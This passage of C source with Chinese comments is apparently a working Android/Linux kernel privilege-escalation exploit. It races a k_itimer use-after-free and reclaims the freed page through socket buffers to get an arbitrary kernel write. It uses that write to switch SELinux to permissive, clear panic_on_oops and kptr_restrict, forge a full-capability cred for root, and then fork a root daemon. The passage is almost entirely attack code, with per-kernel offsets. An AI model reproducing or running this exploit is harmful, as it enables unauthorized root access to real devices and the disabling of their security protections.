            uint64_t *rbn = (uint64_t *)(pat + node_off);
            rbn[0] = cred_kva;                 /* __rb_parent_color */
            rbn[1] = 0;                        /* rb_right: left-child branch */
            rbn[2] = g_task + P.task_cred;     /* rb_left: &task->cred */
        }
        cred = (uint64_t *)(pat + cred_off);
        if (P.cred_uid >= 8) {
            /* 6.6 / 6.12 / 6.18：usage 占 8 字节，uid@8 */
            cred[0] = cred_kva;             /* usage，非 0 防止 put_cred 提前回收 */
            cred[1] = 0;                    /* uid / gid */
            cred[2] = 0;                    /* suid / sgid */
        } else {
            /* 5.15 / 6.1：usage@0(4B)、uid@4、gid@8、suid@12、
             * sgid@16、euid@20。cred 已整体 memset 0，uid/euid 天然
             * 为 0；这里只补一个足够大的 usage，防 put_cred 回收伪页。 */
            *(uint32_t *)(pat + cred_off) = 0x40000000u;
        }
        *(uint64_t *)(pat + cred_off + P.cred_cap_inh)  = FULLCAP;
        *(uint64_t *)(pat + cred_off + P.cred_cap_perm) = FULLCAP;
        *(uint64_t *)(pat + cred_off + P.cred_cap_eff)  = FULLCAP;
        *(uint64_t *)(pat + cred_off + P.cred_cap_bset) = FULLCAP;
        *(uint64_t *)(pat + cred_off + P.cred_cap_amb)  = FULLCAP;
        *(uint64_t *)(pat + cred_off + P.cred_off_security)   = page + blob;
        *(uint64_t *)(pat + cred_off + P.cred_off_user)       = slide_addr(P.root_user);
        *(uint64_t *)(pat + cred_off + P.cred_off_user_ns)    = slide_addr(P.user_ns);
        *(uint64_t *)(pat + cred_off + P.cred_off_ucounts)    = slide_addr(P.ucounts);
        *(uint64_t *)(pat + cred_off + P.cred_off_groups)     = slide_addr(P.groups);
        g_cred_kva = cred_kva;
        STAGE_LOG("rb_node=%#" PRIx64 " cred=%#" PRIx64 " task+cred=%#" PRIx64
                  " off=%#x/%#x",
                  node_kva, cred_kva, g_task + P.task_cred, node_off, cred_off);
    } else {
        unsigned align = node_off % 24u;
        for (unsigned off = align; off + 24 <= 8192; off += 24) {
            uint64_t *node = (uint64_t *)(pat + off);
            node[0] = 0; node[1] = 0; node[2] = target;
        }
        STAGE_LOG("tile align=%u off=%#x target=%#" PRIx64, align, node_off, target);
    }
    return 0;
}

static int g_stream[4][2];
static int g_nstream;
static void close_stream(void)
{
    for (int i = 0; i < g_nstream; i++) {
        if (g_stream[i][0] >= 0) close(g_stream[i][0]);
        if (g_stream[i][1] >= 0) close(g_stream[i][1]);
        g_stream[i][0] = g_stream[i][1] = -1;
    }
    g_nstream = 0;
}
static int open_stream_pairs(int big)
{
    g_nstream = 0;
    for (int i = 0; i < 4; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i])) break;
        setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
        setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
        fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
        g_nstream++;
    }
    return g_nstream ? 0 : -1;
}

static int reclaim_stream(uint64_t victim, uint64_t target)
{
    uint64_t base = object_pfn(victim + P.kitimer_node) & ~UINT64_C(1);
    unsigned node_off = (unsigned)((victim + P.kitimer_node) & 0x1fff);
    unsigned char *pat;
    int big = 16 << 20, hit = 0, writes = 0, ncpu;
    struct timespec start, now;
    if (node_off + 24 > 8192) return -1;
    if (base == 0 || base > (UINT64_C(1) << 24)) {
        STAGE_LOG("PFN 异常 %#" PRIx64 "：page_offset=%#" PRIx64
                  " 不可信（校准 B 失败会退到画像默认值），本轮回填必然 miss",
                  base, P.page_offset);
    }
    pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pat == MAP_FAILED) return -1;
    memset(pat, 0, 8192);
    if (build_stream_pattern(pat, node_off, base, target, victim)) {
        munmap(pat, 8192); return -1;
    }
    if (open_stream_pairs(big)) { munmap(pat, 8192); return -1; }
    ncpu = cpu_count();
    STAGE_LOG("pairs=%d node_base=%#" PRIx64 " off=%#x", g_nstream, base, node_off);

    if (write_file(TRACE "/buffer_size_kb", "65536\n")) { close_stream(); return -1; }
    /* mm_page_alloc / mm_page_free 和 kmem_cache_alloc 一样，直接写 enable 会
     * 被拒，只能借 rss_stat 的 trigger。而 trigger 要等 rss_stat 跨过
     * TASK_RSS_EVENTS_THRESH(64 页) 才执行一次 —— 单页 kick_rss() 永远跨不过，
     * 两个事件就一直是 0，后面的 trace_seen() 看不到目标页，表现成
     * 「已释放页=0 → page_miss」，还会白等 8 秒。这里先 stir 到非 0 再开窗口。 */
    trigger_cmd("enable_event:kmem:mm_page_alloc\n");
    trigger_cmd("enable_event:kmem:mm_page_free\n");
    for (int t = 0; t < 16; t++) {
        if (event_state("mm_page_alloc") && event_state("mm_page_free"))
            break;
        stir_rss(2);
    }
    STAGE_LOG("page 事件 enable=%d/%d", event_state("mm_page_alloc"),
              event_state("mm_page_free"));
    if (trace_off_on()) { close_stream(); return -1; }

    /* 等目标物理页真的被释放（armed timer 到期 / SIGKILL 回收） */
    {
        struct timespec nap = { .tv_nsec = 200000000 };
        int freed = 0, waitn = g_fast ? 12 : 40;
        for (int i = 0; i < waitn && !freed; i++) {
            nanosleep(&nap, NULL);
            freed = trace_seen("mm_page_free:", base);
        }
        STAGE_LOG("已释放页=%d", freed);
    }
    /* 反复写 8KB，让 skb 把刚释放的页重新占回来并填入我们构造的内容 */
    clock_gettime(CLOCK_MONOTONIC, &start);
    {
        int rounds = g_fast ? 10 : 6;
        for (int round = 0; round < rounds && !hit; round++) {
            int sends = g_fast ? 200 : 80;
            for (int i = 0, sock = 0; i < sends && !hit; i++) {
                ssize_t n;
                pin_cpu(i % ncpu);
                n = write(g_stream[sock][0], pat, 8192);
                if (n == 8192) writes++;
                else if (++sock >= g_nstream) break;
            }
            hit = trace_seen("mm_page_alloc:", base);
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec - start.tv_sec > 8) break;
        }
    }
    write_file(TRACE "/tracing_on", "0\n");
    if (hit) STAGE_LOG("命中 pfn=%#" PRIx64, base);
    STAGE_LOG("writes=%d hit=%d", writes, hit);
    quiet_reclaim_trace();
    munmap(pat, 8192);
    if (!hit) close_stream();
    return hit ? 0 : -1;
}

/* ==========================================================================
 * [6] one_uaf(target) —— 单次利用原语
 * 原项目：uaf_plant.c:one_uaf
 * 一次调用 = 一次完整的「制造 UAF → 取 victim → 回填 → 完成一次内核写」。
 * SELinux 与 cred 两个阶段都是循环调用它，只是 target 与回填形态不同。
 * ========================================================================== */
static int one_uaf(uint64_t target)
{
    struct timespec c0, c1;
    long cms;
    pid_t child;
    uint64_t victim = 0;
    int nptr = 0;
    clock_gettime(CLOCK_MONOTONIC, &c0);

    atomic_store_explicit(&g_go, 0, memory_order_relaxed);
    atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
    atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
    atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
    atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
    atomic_store_explicit(&ipc->will_exec, 0, memory_order_relaxed);
    ipc->nhelpers = 0;

    child = fork();
    if (child < 0) return -1;
    if (child == 0) {
        if (g_wake[0] >= 0) close(g_wake[0]);
        if (g_wake[1] >= 0) close(g_wake[1]);
        if (g_report[0] >= 0) close(g_report[0]);
        if (g_report[1] >= 0) close(g_report[1]);
        child_race();
    }
    if (wait_phase(1)) {
        kill(child, SIGKILL); stop_helpers(); waitpid(child, NULL, 0);
        return -1;
    }
    if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
        arm_kmem_cache_alloc() || trace_off_on()) {
        kill(child, SIGKILL); stop_helpers(); return -1;
    }
    atomic_store_explicit(&ipc->phase, 2, memory_order_release);
    if (wait_phase(3)) {                       /* 2048 个 timer 已创建 */
        write_file(TRACE "/tracing_on", "0\n");
        kill(child, SIGKILL); stop_helpers(); waitpid(child, NULL, 0);
        return -1;
    }
    write_file(TRACE "/tracing_on", "0\n");
    if (collect_nth(1024, &nptr, &victim) || nptr < 1500) {
        STAGE_LOG("collect_nth 失败 nptr=%d victim=%#" PRIx64
                  "（不是回填未命中，是 k_itimer 记录没抓够）", nptr, victim);
        kill(child, SIGKILL); stop_helpers(); waitpid(child, NULL, 0);
        return -1;
    }
    disarm_kmem_cache_alloc();
    atomic_store_explicit(&ipc->phase, 4, memory_order_release);
    /* g_cred_kva is set by build_stream_pattern(): the cred no longer sits at
     * victim+P.kitimer_node, that address must stay a valid (zeroed) rb_node. */
    if (reclaim_stream(victim, target)) {
        /* 已进入 execve 就不能 kill：exit_itimers 可能已跑过写原语，树已脏 */
        int we = atomic_load_explicit(&ipc->will_exec, memory_order_acquire);
        if (we) {
            STAGE_LOG("page_miss 且已 exec：child=%d 转常驻守墓", (int)child);
        } else {
            kill(child, SIGKILL);
            waitpid(child, NULL, 0);
        }
        stop_helpers();
        clock_gettime(CLOCK_MONOTONIC, &c1);
        cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
        STAGE_LOG("ms=%ld result=page_miss，重试", cms);
        return -1;
    }
    close_stream();
    if (wait_exec_hold(child)) {
        STAGE_LOG("child=%d 未进入常驻态，回收", (int)child);
        kill(child, SIGKILL);
        stop_helpers();
        waitpid(child, NULL, 0);
        return -1;
    }
    clock_gettime(CLOCK_MONOTONIC, &c1);
    cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
    STAGE_LOG("child=%d 常驻守墓 ms=%ld result=ok fast=%d", (int)child, cms, g_fast);
    log_sync();
    stop_helpers();
    /* 不 waitpid：child 必须存活，否则清理路径遍历被写坏的 timerqueue */
    return 0;
}

/* ==========================================================================
 * [7] 关闭 SELinux
 * 原项目：uaf_plant.c:2218-2255
 * target = slide_addr(selinux_link) - 7：写原语把 selinux_enforcing 清零。
 * 每轮开头先读 /sys/fs/selinux/enforce，== '0' 立刻停止 —— 已经是 Permissive
 * 就不会再重复写 0。-7 是仓库里实测得到的对齐偏移。
 * --skip-selinux-check 走另一条路径：不读 enforce、不判断状态，直接执行写原语
 * 清零，也不回读确认；终止条件只能是「写原语本身成功」（one_uaf 返回 0）。
 * 默认路径逐字节保持不变。
 * ========================================================================== */
static int read_enforce_is_permissive(void)
{
    char c = 0;
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        int e = errno;
        LOG_V1("[selinux] 打不开 /sys/fs/selinux/enforce errno=%d (%s)",
               e, strerror(e));
        /* 用保存的 e：clog_line 内部可能改 errno，不能用活值 */
        STAGE_LOG("读取 enforce 失败 errno=%d", e);
        return 0;
    }
    {
        ssize_t r = read(fd, &c, 1);
        (void)r;
    }
    close(fd);
    LOG_V1("[selinux] enforce=%c -> %s", c ? c : '?',
           c == '0' ? "Permissive" : "Enforcing");
    STAGE_LOG("enforce=%c", c ? c : '?');
    return c == '0';
}

/* 写原语前最后一道闸：target 必须 = selinux_link + 合理 slide。
 * 校准 A 的众数偶尔会取到噪声 call_site，解出上百 GiB 的 slide；此时
 * target 落在 vmalloc/无效区，内核在 exit_itimers() 里对悬垂 rb_node 做的
 * 那次指针写就会写到野地址 -> panic -> 设备重启。宁可拒绝执行也不要盲写。 */
static int selinux_target_ok(uint64_t sel)
{
    uint64_t want = sel + 7;                 /* 还原 selinux_enforcing 地址 */
    if (want < P.selinux_link) return 0;
    return slide_in_window(want - P.selinux_link);
}

static int stage_d_disable_selinux(void)
{
    uint64_t sel = slide_addr(P.selinux_link) - 7;

    if (!selinux_target_ok(sel)) {
        LOG_ERR("[selinux] 目标地址不可信，拒绝执行写原语："
                "selinux_link=%#" PRIx64 " target=%#" PRIx64
                " slide=%#" PRIx64 " 窗口=[%#" PRIx64 ", %#" PRIx64 "]。"
                "请核对 C98260_SLIDE 与 --profile 是否匹配本次内核；"
                "确属定制 KASLR 时用 --max-slide 放宽。",
                P.selinux_link, sel, g_slide, g_slide_min, g_slide_max);
        disarm_all();
        return -2;                        /* 致命：继续只会写坏内核 */
    }

    /* --skip-selinux-check：不读 /sys/fs/selinux/enforce、不判断当前状态，
     * 无条件执行写原语清零。没有状态回读，唯一终止条件是写原语本身成功
     * （one_uaf 返回 0），最多重试 12 轮；成功后立即停，避免重复写放大
     * panic 风险。与 --selinux-only 同用时 DONE 只表示「写原语已执行」，
     * 另输出 C98260_SELINUX_UNVERIFIED=1 供宿主区分「已确认/未回读」。 */
    if (g_skip_selinux_check) {
        int ok = 0;
        STAGE_LOG("跳过 SELinux 状态检查：直接清零 target=%#" PRIx64, sel);
        for (int i = 1; i <= 12; i++) {
            STAGE_LOG("第 %d/12 次强制写零 target=%#" PRIx64, i, sel);
            if (!one_uaf(sel)) {
                ok = 1;
                STAGE_LOG("写原语执行成功（未回读 enforce）");
                break;
            }
        }
        if (g_selinux_only) {
            STAGE_LOG("仅关闭 SELinux 模式：在改写 cred 之前停止");
            if (!ok) {
                STAGE_LOG("12 轮写原语均未成功执行，中止");
                disarm_all();
                return 7;
            }
            LOG_WARN("[selinux] 已跳过 enforce 回读，DONE 仅表示写原语执行完毕，"
                     "实际 SELinux 状态未确认");
            dprintf(STDOUT_FILENO, "C98260_SELINUX_ONLY_DONE=1\n");
            dprintf(STDOUT_FILENO, "C98260_SELINUX_UNVERIFIED=1\n");
            log_sync(); disarm_all();
            return 0;
        }
        if (!ok)
            LOG_WARN("[selinux] 12 轮写原语均未成功执行，后续阶段仍继续");
        return 1;   /* 完整链不因「未确认」中止，沿用旧路径返回语义 */
    }

    for (int i = 1; i <= 12; i++) {
        if (read_enforce_is_permissive()) {
            STAGE_LOG("已确认 Permissive（第 %d/12 次）", i);
            if (g_selinux_only) {
                /* 目标达成：不进 cred 改写循环、不 fork rootd、不加载 KSU。
                 * 本模式没有伪造 cred 持有者，可直接退出。 */
                STAGE_LOG("仅关闭 SELinux 模式：在改写 cred 之前停止");
                dprintf(STDOUT_FILENO, "C98260_SELINUX_ONLY_DONE=1\n");
                log_sync(); disarm_all();
                return 0;   /* 用特殊返回码通知 main 提前收尾 */
            }
            return 1;
        }
        STAGE_LOG("第 %d/12 次尝试 target=%#" PRIx64, i, sel);
        if (!one_uaf(sel)) (void)read_enforce_is_permissive();
    }
    if (g_selinux_only) {
        STAGE_LOG("仅关闭 SELinux：12 次后仍为 Enforcing，中止");
        disarm_all();
        return 7;
    }
    STAGE_LOG("12 轮结束，未显式确认 Permissive（后续 stage 仍会继续）");
    return 1;
}

/* ==========================================================================
 * [8] 伪造 cred 提权 + 验证
 * 原项目：uaf_plant.c:2256-2286
 * ========================================================================== */
/*
 * 关掉 panic_on_oops。
 *
 * 首选写原语清 .data：不需要 uid=0、不需要 capability，SELinux 也拦不住。
 * 写 0 走 __rb_erase_augmented() 的 pc==0 分支，__rb_change_child() 以
 * parent==NULL 收尾，不会给红黑树留下假父节点。代价是一次 one_uaf，
 * 会留一个 --exec-hold 守墓进程。
 */
static void defuse_panic(void)
{
    uint64_t addr = slide_addr(KADDR_PANIC_ON_OOPS);

    if (g_panic_defused)
        return;
    if (!g_slide_known) {
        /* slide 未知时地址会指错页，写 0 可能撞坏别的数据 */
        STAGE_LOG("slide 未知，跳过 panic_on_oops 写原语");
        return;
    }

    for (int i = 1; i <= 3 && !g_panic_defused; i++) {
        if (one_uaf(addr) == 0) {
            g_panic_defused = 1;
            STAGE_LOG("panic_on_oops=0 addr=%#" PRIx64 "（第 %d 轮写原语命中）",
                      addr, i);
        } else {
            STAGE_LOG("panic_on_oops 写原语第 %d/3 轮未命中", i);
        }
    }
    if (!g_panic_defused)
        STAGE_LOG("panic_on_oops 未清零，稍后残血 root 再走 sysctl");
}

/* 回退：残血 root 已就位时写 sysctl。该表项 handler 是 proc_dointvec，
 * 不像 kptr_restrict 的 proc_dointvec_minmax_sysadmin 要 CAP_SYS_ADMIN。 */
static void defuse_panic_sysctl(void)
{
    int fd;

    if (g_panic_defused)
        return;
    fd = open("/proc/sys/kernel/panic_on_oops", O_WRONLY);
    if (fd < 0) {
        STAGE_LOG("panic_on_oops 打开失败 errno=%d", errno);
        return;
    }
    if (write(fd, "0\n", 2) != 2) {
        STAGE_LOG("panic_on_oops 写入失败 errno=%d", errno);
    } else {
        g_panic_defused = 1;
        STAGE_LOG("panic_on_oops 已清零，oops 不再整机 panic");
    }
    close(fd);
}

/* ==========================================================================
 * [E2.5] 暴露 /proc/kallsyms
 *
 * 6.1.134 的 kallsyms_show_value()（反汇编 0xffffffc0089eb110，被
 * kallsyms_open 以 file->f_cred 内联调用）实际是三分支：
 *
 *   kptr_restrict >= 2  -> 0（谁都看不到，包括 full-cap root）
 *   kptr_restrict == 1  -> capable(CAP_SYSLOG)
 *   kptr_restrict == 0  -> perf_event_paranoid < 2 ? 1 : capable(CAP_SYSLOG)
 *
 * 所以「只把 kptr_restrict 写成 0」并不等于放行：Android 默认
 * perf_event_paranoid=3，会 fallthrough 到 CAP_SYSLOG；残血 root 的
 * CapEff=0 没有 CAP_SYSLOG，仍然读不到。必须把 paranoid 压到 <=1。
 *
 * 两条路径：
 *   官方 sysctl —— 残血 root（euid=0）对 0644/root 文件有 owner 写权限，
 *     test_perm 只看 euid 和 mode；perf_event_paranoid 的 handler 是普通
 *     proc_dointvec_minmax，能写。kptr_restrict 的 handler 是 Android 定制
 *     proc_dointvec_minmax_sysadmin，要求 CAP_SYS_ADMIN，残血 root 写不动。
 *   写原语 —— 8 字节写零，两个地址都按 8 字节槽安全落位（见宏注释）。
 *
 * 注意 f_cred 语义：可见性在 open("/proc/kallsyms") 那一刻决定，之前
 * 打开的 fd 不会因为后来提权而解除遮蔽——必须重新 open 才能验证。
 * ========================================================================== */
static int sysctl_read_int(const char *path, int *out)
{
    char b[32];
    ssize_t n;
    int fd = open(path, O_RDONLY);

    if (fd < 0) return -1;
    n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    *out = atoi(b);
    return 0;
}

static int sysctl_write_int(const char *path, int v)
{
    char b[16];
    int fd, n = snprintf(b, sizeof(b), "%d\n", v);

    fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    if (write(fd, b, (size_t)n) != n) { close(fd); return -1; }
    close(fd);
    return 0;
}

/* 重新 open /proc/kallsyms，取 _text 与 stage_a 的 slide 交叉校验。
 * 返回 0 表示确实读到了非零地址（遮蔽时所有值都是 0）。
 * 读到值就以它为权威：stage_a 没成功时直接反推 slide；算错了就改回来。
 * 这比「校验」更有价值——kallsyms 是唯一不依赖画像的自证来源。 */
static int kallsyms_probe_text(void)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[256], nm[128];
    unsigned long long a;
    char t;
    uint64_t text = 0, derived;

    if (!f) return -1;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%llx %c %127s", &a, &t, nm) == 3 &&
            !strcmp(nm, "_text")) {
            text = a;
            break;
        }
    }
    fclose(f);
    if (!text) return -1;

    derived = text - UINT64_C(0xffffffc008000000);
    if (!g_slide_known) {
        g_slide = derived;
        g_slide_known = 1;
        STAGE_LOG("kallsyms 反推 slide=%#" PRIx64 "（_text=%#" PRIx64
                  "，stage_a 未成功，改用此值）", derived, text);
    } else if (derived != g_slide) {
        STAGE_LOG("kallsyms _text=%#" PRIx64 " 反推 slide=%#" PRIx64
                  "，与 stage_a 的 %#" PRIx64 " 不符，改用 kallsyms",
                  text, derived, g_slide);
        g_slide = derived;
    } else {
        STAGE_LOG("kallsyms 校验通过：_text=%#" PRIx64 " == 0xffffffc008000000+slide",
                  text);
    }
    return 0;
}

static void stage_expose_kallsyms(void)
{
    int kptr = -1, par = -1, w = 0;

    if (g_kallsyms_ok) return;

    sysctl_read_int("/proc/sys/kernel/kptr_restrict", &kptr);
    sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &par);
    STAGE_LOG("kallsyms 前置：kptr_restrict=%d perf_event_paranoid=%d", kptr, par);

    /* 1) 官方路径：能写就写，零副作用、可回读 */
    if (kptr > 0 && sysctl_write_int("/proc/sys/kernel/kptr_restrict", 0) == 0)
        w |= 1;
    if (par > 1 && sysctl_write_int("/proc/sys/kernel/perf_event_paranoid", 0) == 0)
        w |= 2;
    if (w) STAGE_LOG("sysctl 已改：kptr%s perf%s", (w & 1) ? "=0" : " 未变",
                     (w & 2) ? "=0" : " 未变");

    /* 2) 写原语兜底（残血 root 没有 CAP_SYS_ADMIN，Android handler 会拒） */
    if (!(w & 1) && kptr != 0) {
        if (!g_slide_known) {
            STAGE_LOG("slide 未知，跳过 kptr_restrict 写原语");
        } else {
            uint64_t a = slide_addr(KADDR_KPTR_RESTRICT);
            if (one_uaf(a) == 0) w |= 1;
            STAGE_LOG("写原语 kptr_restrict=0 addr=%#" PRIx64 " %s",
                      a, (w & 1) ? "命中" : "未命中");
        }
    }
    if (!(w & 2) && par > 1) {
        if (!g_slide_known) {
            STAGE_LOG("slide 未知，跳过 perf_event_paranoid 写原语");
        } else {
            uint64_t a = slide_addr(KADDR_BPF_PARANOID_PAIR);
            if (one_uaf(a) == 0) w |= 2;
            STAGE_LOG("写原语 perf_event_paranoid=0（连带 bpf_disabled）addr=%#" PRIx64 " %s",
                      a, (w & 2) ? "命中" : "未命中");
        }
    }

    sysctl_read_int("/proc/sys/kernel/kptr_restrict", &kptr);
    sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &par);
    STAGE_LOG("kallsyms 后置：kptr_restrict=%d perf_event_paranoid=%d", kptr, par);

    if (kallsyms_probe_text() == 0) {
        g_kallsyms_ok = 1;
        STAGE_LOG("/proc/kallsyms 已暴露（KALLSYMS_ALL=y，数据符号也在）");
    } else {
        STAGE_LOG("/proc/kallsyms 仍被遮蔽，后续继续用画像偏移");
    }
    log_sync();
}

/* ==========================================================================
 * [E0] 写零直通车
 *
 * 只做一件事：把 0 写到给定地址。用于「不跑整条链、只想关掉某个开关」
 * 的场景（kptr_restrict / perf_event_paranoid / panic_on_oops / 自定义）。
 *
 * 前提：slide 与 page_offset 已就位（stage_a / stage_b 跑过，或命令行给）。
 * one_uaf() 的地址换算依赖 P.page_offset，链接地址还要 g_slide。
 * 每次 poke 都烧一个 UAF 并留一个守墓进程——树已脏，收尸必 oops。
 * ========================================================================== */
static int poke_add(uint64_t addr, int kind, const char *why)
{
    if (g_npoke >= MAX_POKES) return -1;
    g_pokes[g_npoke].addr = addr;
    g_pokes[g_npoke].kind = kind;
    g_pokes[g_npoke].why = why;
    g_npoke++;
    return 0;
}

/* 三条符号目标共用：画像里有就用，没有则只在 6.1.134 上退回内置常量。
 * 其它 KMI 一律失败——把 6.1.134 的 .data 地址写到 6.6 上就是往
 * 随机内核地址写 0，比不写危险得多。 */
static int poke_sym(uint64_t link, uint64_t fallback, uint64_t *out, const char **src)
{
    if (link) {
        *out = slide_addr(link & ~UINT64_C(7));
        *src = "画像符号+slide";
        return 0;
    }
    if (strstr(P.release, "6.1.134")) {
        *out = slide_addr(fallback & ~UINT64_C(7));
        *src = "画像缺符号，内置 6.1.134";
        return 0;
    }
    *src = "画像没有这个符号，请重新解析 boot.img";
    return -1;
}

/* 把一条目标展开成「运行时地址 + 来源说明」。
 * 符号类在这里才读 P：--profile 可能出现在 --poke-kptr 之后。 */
static int poke_resolve(const struct poke_ent *e, uint64_t *out, const char **src)
{
    switch (e->kind) {
    case POKE_ABS:
        *out = e->addr;
        *src = "绝对地址";
        return 0;
    case POKE_LINK:
        *out = slide_addr(e->addr);
        *src = "链接地址+slide";
        return 0;
    case POKE_SYM_KPTR:
        return poke_sym(P.kptr_link, KADDR_KPTR_RESTRICT, out, src);
    case POKE_SYM_PARANOID:
        return poke_sym(P.paranoid_link, KADDR_BPF_PARANOID_PAIR, out, src);
    case POKE_SYM_PANIC:
        return poke_sym(P.panic_link, KADDR_PANIC_ON_OOPS, out, src);
    default:
        *src = "目标类型未知";
        return -1;
    }
}

static int run_pokes(void)
{
    int fail = 0;

    for (int i = 0; i < g_npoke; i++) {
        uint64_t a = 0;
        const char *src = "";
        int ok = 0;

        /* 符号类也是链接地址，同样要 slide */
        if (g_pokes[i].kind != POKE_ABS && !g_slide_known) {
            STAGE_LOG("poke[%d] %s 需要 slide，跳过（给 --slide 或先跑校准 A）",
                      i, g_pokes[i].why);
            fail = 1;
            continue;
        }
        if (poke_resolve(&g_pokes[i], &a, &src)) {
            STAGE_LOG("poke[%d] %s 跳过：%s", i, g_pokes[i].why,
                      (src && *src) ? src : "目标未知");
            fail = 1;
            continue;
        }

        STAGE_LOG("poke[%d] %s addr=%#" PRIx64 "（%s）", i, g_pokes[i].why, a, src);
        log_sync();
        for (int r = 1; r <= g_poke_retry && !ok; r++) {
            if (one_uaf(a) == 0) ok = 1;
            else STAGE_LOG("poke[%d] 第 %d/%d 轮未命中", i, r, g_poke_retry);
        }
        STAGE_LOG("poke[%d] %s %s", i, g_pokes[i].why, ok ? "命中" : "失败");
        if (!ok) fail = 1;
        log_sync();
    }

    /* 回读自证：这三个 sysctl 都是 0444，普通用户可见 */
    {
        int v;
        if (sysctl_read_int("/proc/sys/kernel/kptr_restrict", &v) == 0)
            STAGE_LOG("回读 kptr_restrict=%d", v);
        if (sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &v) == 0)
            STAGE_LOG("回读 perf_event_paranoid=%d", v);
        if (sysctl_read_int("/proc/sys/kernel/panic_on_oops", &v) == 0)
            STAGE_LOG("回读 panic_on_oops=%d", v);
        if (kallsyms_probe_text() == 0)
            STAGE_LOG("/proc/kallsyms 现可读（poke 生效）");
        else
            STAGE_LOG("/proc/kallsyms 仍不可读（kptr 或 perf 未到位）");
    }
    return fail;
}

static int stage_e_escalate_cred(void)
{
    int rooted = 0;
    uint64_t caps = 0;

    /*
     * 顺序：先残血 root，再关 panic_on_oops，最后补 caps。
     *
     * 写原语每次都会把承载 timer 的 task 的 timerqueue 红黑树改坏
     * （root->rb_node 写成 &task->cred 或页内假节点）。守墓进程能挡住
     * 清理，但它被 OOM/SIGKILL 杀掉时，oops 落在 release_task 里——
     * 那里同时持 tasklist_lock（写）和 sighand->siglock，panic 与否
     * 都会死锁。所以先用最可靠的写 0 路径拿到 euid=0，立刻关掉
     * panic_on_oops 兜底，再去做风险更高的 full-cap。
     */

    /* [E1] 写 0 清 uid/euid/fsuid：只改 cred 结构体，不换 task->cred 指针 */
    for (int attempt = 1; attempt <= 6 && !rooted; attempt++) {
        uint64_t cred = 0;
        STAGE_LOG("E1 第 %d/6 轮：泄漏 cred 地址", attempt);
        if (leak_cred_addr(&cred)) { STAGE_LOG("泄漏失败，重试"); continue; }
        STAGE_LOG("cred=%#" PRIx64 "，清零 uid/euid/fsuid", cred);
        log_sync();
        if (one_uaf(cred + P.cred_uid))        STAGE_LOG("写 cred+%u 未命中页", P.cred_uid);
        if (one_uaf(cred + P.cred_uid + 16))   STAGE_LOG("写 cred+%u 未命中页", P.cred_uid + 16);
        if (one_uaf(cred + P.cred_uid + 24))   STAGE_LOG("写 cred+%u 未命中页", P.cred_uid + 24);
        if (getuid() == 0 && geteuid() == 0) rooted = 1;
        else STAGE_LOG("still uid=%u euid=%u",
                       (unsigned)getuid(), (unsigned)geteuid());
    }
    if (!rooted) {
        STAGE_LOG("6 轮未能清零 uid/euid，提权失败");
        return -1;
    }
    caps = read_cap_eff(getpid());
    STAGE_LOG("残血 root：uid=0 CapEff=%#" PRIx64, caps);

    /* [E2] 写原语没命中时的回退：euid/fsuid 已为 0，写 sysctl 不需要 cap */
    if (!caps)
        defuse_panic_sysctl();

    /* [E2.5] 顺手把 kallsyms 打开：拿到符号表就能校验 slide、脱离硬编码 */
    if (!g_kallsyms_ok)
        stage_expose_kallsyms();

    /* [E3] 伪造整页 cred，把 cap_effective 补满 */
    if (!caps) {
        g_plant_cred = 1;
        for (int attempt = 1; attempt <= 4 && !caps; attempt++) {
            uint64_t ck;
            STAGE_LOG("E3 第 %d/4 轮：伪造 cred 页", attempt);
            g_cred_kva = 0;
            if (one_uaf(0)) { STAGE_LOG("写 task->cred 未命中页，重试"); continue; }
            ck = g_cred_kva;
            if (!ck) { STAGE_LOG("页内 cred 地址未生成，重试"); continue; }
            STAGE_LOG("task=%#" PRIx64 " -> cred=%#" PRIx64, g_task, ck);
            log_sync();
            g_plant_cred = 0;
            if (one_uaf(ck + 8)) STAGE_LOG("清 cred+8 未命中页");
            g_plant_cred = 1;
            caps = read_cap_eff(getpid());
            if (caps) {
                STAGE_LOG("完整 root：uid=0 euid=0 CapEff=%#" PRIx64, caps);
            } else {
                STAGE_LOG("still uid=%u euid=%u CapEff=%#" PRIx64,
                          (unsigned)getuid(), (unsigned)geteuid(), caps);
            }
        }
        g_plant_cred = 0;
    }

    /* E3 成功后有了 CAP_SYS_ADMIN，E2.5 被拒的 sysctl 这次一定放行 */
    if (!g_kallsyms_ok && caps)
        stage_expose_kallsyms();

    /* 成功的是主进程，cred_child 仍是 shell，rootd 由主进程拉起 */
    if (caps && !g_rootd_forked) {
        pid_t rd = fork();
        if (rd == 0) { setpgid(0, 0); run_rootd(); _exit(0); }
        g_rootd_forked = 1;
        STAGE_LOG("主进程已 fork rootd pid=%d", (int)rd);
    }
    STAGE_LOG("子进程=%d 正在钉住页面（父进程 pid=%d）",
              (int)g_cred_child_pid, (int)getpid());
    log_sync();
    return 0;
}

/* ==========================================================================
 * [9] 提权后动作（【等价简化】）
 * 原项目把这三块拆成 pc98260_rootd.c(567 行) / ksu.c(391 行) /
 * netshell.c(276 行)，并强调一条铁律：这些进程必须持有「正规 cred」，
 * 绝不能在伪造 cred 的钉页进程里常驻（否则任何释放页/杀进程都可能 panic）。
